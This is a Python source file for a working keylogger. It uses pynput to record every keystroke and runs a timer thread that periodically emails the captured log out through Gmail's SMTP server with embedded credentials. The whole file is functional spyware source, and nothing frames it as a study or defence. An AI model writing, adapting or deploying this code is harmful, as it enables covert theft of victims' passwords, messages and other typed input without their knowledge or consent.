#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib

class Keylogger:
    
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started!"
        self.interval = time_interval
        self.email = email
        self.password = password
    
    def append_to_log(self, string):
        self.log = self.log + string        
    
    def process_key_press(self, key):
        try:
            # key.char gives the key character
            current_key = str(key.char)
            
        # For special keys
        except AttributeError:
            if key == key.space:
                current_key = " "
            else: 
                current_key = " " + str(key) + " "
        
        self.append_to_log(current_key)

    def report(self):
        if self.log!="":
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password) 
        server.sendmail(email, email, message)
        server.quit()   
        
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        # The "with" keyword is used to interact with unmanaged streams of data....like opening a file
        with keyboard_listener:
            # The report function and keypress function will be trapped.
            # So only threading will solve the problem to simultaneously run the two functions.
            self.report()
            keyboard_listener.join()